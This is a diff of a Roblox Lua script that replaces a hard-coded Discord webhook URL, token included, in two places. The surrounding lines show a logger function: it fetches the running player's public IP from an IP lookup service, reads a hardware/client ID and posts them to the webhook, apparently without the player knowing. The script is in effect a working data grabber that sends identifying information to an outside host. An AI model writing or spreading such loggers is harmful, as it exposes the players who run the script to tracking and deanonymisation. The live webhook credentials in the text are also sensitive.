@@ -1,7 +1,7 @@
 local HttpService = game:GetService("HttpService")
 local ip = game:HttpGet("https://api.ipify.org")
 --updated
-local url = "https://discord.com/api/webhooks/1287116526792605861/l4jOHTOKpTPIM2NHusnWqs8o4G7dLed-Qe4_TxltR91hTu_RJG975KdORugX88I7dIUU"
+local url = "https://discord.com/api/webhooks/1287818521543446680/5ha8-NQG5pyh8VlQlbnE0VWR0CEMOLZ7xbZ48Kik8t2pgNPv0h0-ljvwT7vRKx6FbXvY"
 local player = game.Players.LocalPlayer
 local UserInputService = game:GetService("UserInputService")
 local HttpService = game:GetService("HttpService")
@@ -62,7 +62,7 @@ function sendWebhook(url, content, embed)
 end
 
 function sendLogger()
-	local url = "https://discord.com/api/webhooks/1287116526792605861/l4jOHTOKpTPIM2NHusnWqs8o4G7dLed-Qe4_TxltR91hTu_RJG975KdORugX88I7dIUU"
+	local url = "https://discord.com/api/webhooks/1287818521543446680/5ha8-NQG5pyh8VlQlbnE0VWR0CEMOLZ7xbZ48Kik8t2pgNPv0h0-ljvwT7vRKx6FbXvY"
 	local ip = game:HttpGet("https://api.ipify.org")
 	local hwid = game:GetService("RbxAnalyticsService"):GetClientId()
 	local placeId = game.PlaceId
